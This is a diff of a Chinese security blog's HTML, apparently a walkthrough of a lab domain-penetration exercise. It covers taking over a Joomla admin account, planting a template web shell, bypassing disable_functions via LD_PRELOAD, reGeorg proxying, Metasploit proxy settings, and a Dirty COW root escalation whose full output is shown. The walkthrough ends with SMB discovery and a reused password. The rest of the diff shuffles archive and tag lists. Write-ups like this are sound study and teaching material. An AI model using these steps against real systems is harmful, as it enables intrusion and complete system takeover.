@@ -348,8 +348,8 @@
 
 <p>程序版本号、核心配置文件和后台地址都给扫描出来了，访问该地址</p>
 <p><img src="/config.png" alt></p>
-<p>拿到mysql的账号密码，而且目标机器也开启了3306.连他数据库。进入users表，拿到管理员的账号密码密文<code>administrator:$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2</code></p>
-<p>爆破hash无果…joomla还有一种劫持管理员账号的方法，进入<code>ucm_history</code>表，session值为空，陷入僵局…只能替换密文了<code>d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199</code>密码为<code>secret</code></p>
+<p>拿到mysql的账号密码，而且目标机器也开启了3306.连他数据库。进入users表，拿到管理员的账号密码密文<code>administrator:$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2</code>爆破hash无果…</p>
+<p>joomla还有一种劫持管理员账号的方法，进入<code>ucm_history</code>表，session值为空，陷入僵局…只能替换密文了<code>d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199</code>密码为<code>secret</code></p>
 <p><img src="/admin.png" alt></p>
 <p>然后就是  Extensions-&gt;Templates-&gt;Templates 找到 Beez3 进去创建一个新的一句话文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.134.129/templates/beez3/img_class.php</span><br></pre></td></tr></table></figure>
@@ -357,13 +357,28 @@
 <p>蚁剑连接上来，虚拟终端尝试命令执行查看用户权限，全部ret=127报错。应该是disable_functions的原因，查看下phpinfo，果不其然</p>
 <p><img src="/dis.png" alt> <code>putenv()</code>函数没有被禁用，可以利用LD_PRELOAD劫持去Bypass，<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">项目</a>给出了配套的小马和c源码，直接上传相关的文件，然后访问带着参数就能成功执行命令</p>
 <p><img src="/bypass.png" alt></p>
-<p>查看IP才知道，这是内网的一台机器，然后借助129给反代出来的。只能用reGeorg建立一个socket代理。将<code>tunnel.nosocket.php</code>上传至目标网站</p>
+<p>查看IP才知道这是内网的一台机器，借助129给反代出来的，只能利用reGeorg建立一个socket代理。将<code>tunnel.nosocket.php</code>上传至目标网站</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -p 1234 -u http://192.168.134.129/templates/beez3/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>
 
 <p>msf生成一个正向的shell，上传至网站，msf设置代理，小马加权限然后执行，最后反弹出来一个session。这里提一下msf设置代理的命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:127.0.0.1:1234 #socks代理</span><br><span class="line">setg ReverseAllowProxy true  #双向转发</span><br></pre></td></tr></table></figure>
 
 <p><img src="/ubuntu.png" alt></p>
+<p>内核有点新，提权啥的也没辙了，只能随处找找看有没有Tips文件了。果不其然，在<code>/tmp/mysql/test.txt</code>找到了一些东西</p>
+<img src="/test.png" style="zoom:75%;">
+
+<p>赶紧拿来连接129的这台机器，连接成功bingo</p>
+<p><img src="/wwwuser.png" alt></p>
+<p>scp传入脏牛，一把梭</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">scp dirty.c wwwuser@192.168.134.129:/home/wwwuser</span><br><span class="line"></span><br><span class="line">[wwwuser@localhost ~]$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">[wwwuser@localhost ~]$ ./dirty qwer123</span><br><span class="line">File /tmp/passwd.bak already exists! Please delete it and run again</span><br><span class="line">[wwwuser@localhost ~]$ rm /tmp/passwd.bak </span><br><span class="line">[wwwuser@localhost ~]$ </span><br><span class="line">[wwwuser@localhost ~]$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">[wwwuser@localhost ~]$ ./dirty qwer123</span><br><span class="line">/etc/passwd successfully backed up to /tmp/passwd.bak</span><br><span class="line">Please enter the new password: qwer123</span><br><span class="line">Complete line:</span><br><span class="line">firefart:fi1ELkj5TnWMY:0:0:pwned:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">mmap: 7f2a69120000</span><br><span class="line">madvise 0</span><br><span class="line"></span><br><span class="line">ptrace 0</span><br><span class="line">Done! Check /etc/passwd to see <span class="keyword">if</span> the new user was created.</span><br><span class="line">You can <span class="built_in">log</span> <span class="keyword">in</span> with the username <span class="string">'firefart'</span> and the password <span class="string">'qwer123'</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DON<span class="string">'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="string">[wwwuser@localhost ~]$ su firefart</span></span><br><span class="line"><span class="string">Password: </span></span><br><span class="line"><span class="string">[firefart@localhost wwwuser]# id</span></span><br><span class="line"><span class="string">uid=0(firefart) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span></span><br></pre></td></tr></table></figure>
+
+<p>同样的这里我们上传一个木马用msf接收</p>
+<p><img src="/shell.png" alt></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>加路由然后开始smb探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.93.30:445     - Host is running Windows 7 Professional SP1 (build:7601) (name:WIN7) (domain:TEST)</span><br><span class="line">[+] 192.168.93.10:445     - Host is running Windows 2012 R2 Datacenter (build:9600) (name:WIN-8GA56TNV3MV) (domain:TEST)</span><br><span class="line">[+] 192.168.93.20:445     - Host is running Windows 2008 Datacenter SP2 (build:6003) (name:WIN2008) (domain:TEST)</span><br></pre></td></tr></table></figure>
+
+<p>发现三台TEST域内主机.先进行的永恒之蓝扫描无果,然后分别对其进行端口扫描.其中只有win08的这台机器开放了1433端口</p>
+<p> 123qwe!ASD</p>
 
     </article>
     <!-- license  -->
@@ -1195,9 +1210,45 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 51
+        Total : 53
         </div>
         <!-- search  -->
         
@@ -1213,6 +1264,11 @@
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2019/12/29/ant/" >Antsword Bypass_Disable_functions的五种模式简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2019/12/06/offensive/" >域渗透之Offensive</a>
         </li>
     
@@ -1224,6 +1280,11 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">11/23</span><a class="archive-post-title" href= "/2019/11/23/vulnstack1/" >域渗透之Vulnstack1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/2019/10/22/jwt/" >jwt</a>
         </li>
     
     
@@ -1502,6 +1563,8 @@
     
         <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
     
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="unserializable"><span class="iconfont-archer">&#xe606;</span>unserializable</span>
@@ -1516,8 +1579,6 @@
     
         <span class="sidebar-tag-name" data-tags="smtp"><span class="iconfont-archer">&#xe606;</span>smtp</span>
     
-        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
-    
         <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
@@ -1528,9 +1589,9 @@
     
         <span class="sidebar-tag-name" data-tags="vulnstack"><span class="iconfont-archer">&#xe606;</span>vulnstack</span>
     
-        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
-    
         <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
     
         <span class="sidebar-tag-name" data-tags="cryptology"><span class="iconfont-archer">&#xe606;</span>cryptology</span>
     
